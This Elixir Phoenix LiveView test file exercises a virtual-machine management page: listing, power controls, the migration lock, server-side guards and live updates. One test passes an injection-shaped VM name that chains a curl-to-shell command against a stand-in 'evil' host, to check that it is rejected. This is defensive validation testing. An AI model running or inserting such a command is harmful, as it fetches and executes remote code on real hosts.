defmodule SpectrumPhxWeb.Vms.IndexLiveTest do
  # Not async: the VM source and the task submitter are configured through application
  # env, which is global.
  use SpectrumPhxWeb.ConnCase, async: false

  import Phoenix.LiveViewTest

  alias SpectrumPhx.Vms.Vm

  @vms [
    %Vm{
      name: "web-01",
      vcpu: 2,
      memory: 2048,
      state: "Running",
      host_ip: "10.10.0.11",
      firmware: "uefi",
      disks_list: "10G"
    },
    %Vm{
      name: "db.prod",
      vcpu: 8,
      memory: 16_384,
      state: "Stopped",
      host_ip: "",
      firmware: "bios",
      disks_list: "100G,500G"
    },
    %Vm{
      name: "vm_1",
      vcpu: 1,
      memory: 512,
      state: "Running",
      host_ip: "10.10.0.12",
      status: "migrating",
      disks_list: "20G"
    }
  ]

  setup do
    test_pid = self()

    Application.put_env(:spectrum_phx, :vms_source, {:static, @vms})

    Application.put_env(:spectrum_phx, :vms_task_submitter, fn service, action, payload ->
      send(test_pid, {:task, service, action, payload})
      {:ok, %{"task_id" => "test-task", "status" => "pending"}}
    end)

    on_exit(fn ->
      Application.delete_env(:spectrum_phx, :vms_source)
      Application.delete_env(:spectrum_phx, :vms_task_submitter)
    end)

    :ok
  end

  describe "listing" do
    test "renders each VM with its state, specs and placement", %{conn: conn} do
      {:ok, _view, html} = live(conn, ~p"/vms")

      assert html =~ "web-01"
      assert html =~ "db.prod"
      assert html =~ "vm_1"

      assert html =~ "Running"
      assert html =~ "Stopped"

      assert html =~ "2 vCPU"
      assert html =~ "2048 MiB"
      assert html =~ "10.10.0.11"

      # An unplaced VM says so rather than showing a blank host.
      assert html =~ "Unassigned"
    end

    test "links each VM to its detail page", %{conn: conn} do
      {:ok, view, _html} = live(conn, ~p"/vms")

      assert view |> element(~s{a[href="/vms/web-01"]}) |> has_element?()
      assert view |> element(~s{a[href="/vms/db.prod"]}) |> has_element?()
    end

    test "shows the migration lock separately from the power state", %{conn: conn} do
      # vm_1 is Running *and* migrating: two different columns, and an operator who only
      # sees "Running" will try to start it somewhere else.
      {:ok, view, _html} = live(conn, ~p"/vms")

      html = view |> element("#vm-vm_1") |> render()
      assert html =~ "Running"
      assert html =~ "migrating"
    end

    test "renders an empty state when no VMs are registered", %{conn: conn} do
      Application.put_env(:spectrum_phx, :vms_source, {:static, []})

      {:ok, _view, html} = live(conn, ~p"/vms")
      assert html =~ "No virtual machines are registered yet"
    end
  end

  describe "power controls" do
    test "starting a stopped VM submits a start task", %{conn: conn} do
      {:ok, view, _html} = live(conn, ~p"/vms")

      html = view |> element("#start-db\\.prod") |> render_click()

      assert_received {:task, "vali", "start", %{"vm_name" => "db.prod"}}
      assert html =~ "Start requested for db.prod"
    end

    test "stopping a running VM submits a stop task", %{conn: conn} do
      {:ok, view, _html} = live(conn, ~p"/vms")

      html = view |> element("#stop-web-01") |> render_click()

      assert_received {:task, "vali", "stop", %{"vm_name" => "web-01"}}
      assert html =~ "Stop requested for web-01"
    end

    test "rebooting a running VM submits a reboot task", %{conn: conn} do
      {:ok, view, _html} = live(conn, ~p"/vms")

      view |> element("#reboot-web-01") |> render_click()

      assert_received {:task, "vali", "reboot", %{"vm_name" => "web-01"}}
    end

    test "a stopped VM offers Start and not Stop", %{conn: conn} do
      {:ok, view, _html} = live(conn, ~p"/vms")

      assert view |> element("#start-db\\.prod") |> has_element?()
      refute view |> element("#stop-db\\.prod") |> has_element?()
    end

    test "controls are disabled while the migration lock is held", %{conn: conn} do
      {:ok, view, _html} = live(conn, ~p"/vms")

      assert view |> element("#stop-vm_1[disabled]") |> has_element?()
      assert view |> element("#reboot-vm_1[disabled]") |> has_element?()
    end

    test "the server refuses a locked VM even if the control is driven directly", %{conn: conn} do
      # Disabling the button is presentation. The guard that matters is the one in the
      # context, so drive the event past the UI and check nothing was submitted.
      {:ok, view, _html} = live(conn, ~p"/vms")

      html = render_click(view, "power_on", %{"name" => "vm_1"})

      refute_received {:task, _, _, _}
      assert html =~ "migrating"
    end

    test "the server refuses to start a VM that is already running", %{conn: conn} do
      {:ok, view, _html} = live(conn, ~p"/vms")

      html = render_click(view, "power_on", %{"name" => "web-01"})

      refute_received {:task, _, _, _}
      assert html =~ "already running"
    end

    test "an unknown VM is reported rather than submitted", %{conn: conn} do
      {:ok, view, _html} = live(conn, ~p"/vms")

      html = render_click(view, "power_off", %{"name" => "no-such-vm"})

      refute_received {:task, _, _, _}
      assert html =~ "not in the cluster database"
    end

    test "an injection-shaped name is rejected at the event boundary", %{conn: conn} do
      {:ok, view, _html} = live(conn, ~p"/vms")

      html = render_click(view, "power_on", %{"name" => "a; curl evil|sh"})

      refute_received {:task, _, _, _}
      assert html =~ "Invalid VM name"
    end
  end

  describe "live updates" do
    test "state changes are pushed over the websocket without a page refresh", %{conn: conn} do
      {:ok, view, html} = live(conn, ~p"/vms")
      assert html =~ "Stopped"

      # Something outside this LiveView changed the row -- Vali completing a start, DRS
      # moving a VM, a guest shutting itself down.
      updated =
        Enum.map(@vms, fn
          %Vm{name: "db.prod"} = vm -> %Vm{vm | state: "Running", host_ip: "10.10.0.13"}
          vm -> vm
        end)

      Application.put_env(:spectrum_phx, :vms_source, {:static, updated})
      Phoenix.PubSub.broadcast(SpectrumPhx.PubSub, "vms", {:vm_updated, "db.prod"})

      html = render(view)
      assert html =~ "10.10.0.13"
      assert view |> element("#stop-db\\.prod") |> has_element?()
    end

    test "a poll tick re-reads the VM list", %{conn: conn} do
      {:ok, view, _html} = live(conn, ~p"/vms")

      updated = Enum.map(@vms, fn %Vm{} = vm -> %Vm{vm | state: "Stopped", host_ip: ""} end)
      Application.put_env(:spectrum_phx, :vms_source, {:static, updated})

      send(view.pid, :poll)

      html = render(view)
      refute html =~ "Running"
      assert view |> element("#start-web-01") |> has_element?()
    end
  end
end
